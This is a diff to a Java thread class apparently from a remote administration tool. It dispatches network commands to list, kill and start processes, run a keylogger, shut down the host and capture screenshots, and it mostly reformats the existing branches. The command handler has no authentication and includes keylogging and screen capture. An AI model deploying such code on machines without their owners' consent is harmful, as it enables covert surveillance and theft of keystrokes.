@@ -35,24 +35,23 @@ public class ActionThread extends Thread {
 	public void run() {
 		try {
 			ObjectOutputStream oos = new ObjectOutputStream(outputStream);
-			ObjectInputStream ois = new ObjectInputStream(inputStream);	// throws in first run, need to anylize what happened in first run
+			ObjectInputStream ois = new ObjectInputStream(inputStream); // throws in first run, need to
+											// anylize what happened in
+											// first run
 
 			String request = (String) ois.readObject();
-			
-			System.out.println(request);
-			
 			String[] request_elements = request.split(" ");
 
-			if (request.equals("GET_PROCESS_LIST")) {
+			if (request.equals("START")) {
+				main.addToIpList(fromIP);
+			} else if (request.equals("GET_PROCESS_LIST")) {
 				ListProcess listProcess = new ListProcess(oos);
 				listProcess.set_listProcess();
 				listProcess.sendListProcess();
 
 				this.record = "Get list of process";
 				main.actionRecorded(fromIP, record);
-			}
-
-			else if (request_elements[0].equals("KILL_PROCESS")) {
+			} else if (request_elements[0].equals("KILL_PROCESS")) {
 				ProcessKill processKill = new ProcessKill(oos, request_elements[1]);
 				boolean res = processKill.kill();
 				processKill.send_result();
@@ -64,10 +63,7 @@ public class ActionThread extends Thread {
 					this.record += "pID not found";
 				}
 				main.actionRecorded(fromIP, record);
-			}
-
-			else if (request_elements[0].equals("START_PROCESS")) {
-
+			} else if (request_elements[0].equals("START_PROCESS")) {
 				ProcessStart processStart = new ProcessStart(oos, request_elements[1]);
 				boolean res = processStart.start_file();
 				processStart.send_result();
@@ -79,58 +75,45 @@ public class ActionThread extends Thread {
 					this.record += "name not found";
 				}
 				main.actionRecorded(fromIP, record);
-			}
-
-			else if (request.equals("KEY_LOGGER_START")) {
+			} else if (request.equals("KEY_LOGGER_START")) {
 				KeyLogger keyLogger = new KeyLogger(oos, "");
 				keyLogger.get_Keylogger(oos);
-			} 
-		
-			else if (request.equals("KEY_LOGGER_STOP")) {
+			} else if (request.equals("KEY_LOGGER_STOP")) {
 				KeyLogger keyLogger = new KeyLogger(oos, "");
 				keyLogger.send_KeyLogger();
-			} else if(request.equals("SHUT_DOWN")) {
+			} else if (request.equals("SHUT_DOWN")) {
 				ShutDown shutDown = new ShutDown(oos);
 				shutDown.shutDown();
-			}
-
-			else if (request.equals("SCREEN_CAPTURE")) {
+			} else if (request.equals("SCREEN_CAPTURE")) {
 				ScreenCapture screenCapture = new ScreenCapture(oos);
 				boolean res = screenCapture.get_Screenshot();
 				screenCapture.send_ScreenShot();
-				
+
 				this.record = "Take screenshot";
 				if (res == false) {
 					this.record += " - failed";
 				}
 				main.actionRecorded(fromIP, record);
-			} 
+			} else if (request.equals("END")) {
+				main.removeFromIpList(fromIP);
 
-			else {
-				throw new Exception();
+			} else if (request.equals("CHECK")) {
+				oos.writeObject("FINE");
+				oos.flush();
 			}
-
-			System.out.println("2");
-			
 			oos.close();
 			ois.close();
-		}
-		catch(StreamCorruptedException sce) {
+		} catch (StreamCorruptedException sce) {
 			System.out.println("sce");
-		}
-		catch(IOException ioe) {
-			// Catch on first run, need to check!
-			main.addToIpList(fromIP);
-		}
-		catch(SecurityException se) {
+		} catch (IOException ioe) {
+			System.out.println("ioe");
+		} catch (SecurityException se) {
 			System.out.println("se");
-		}
-		catch(NullPointerException npe) {
+		} catch (NullPointerException npe) {
 			System.out.println("npe");
-		}
-		catch (Exception e) {
+		} catch (Exception e) {
 			System.out.println("e");
 		}
-		
+
 	}
 }
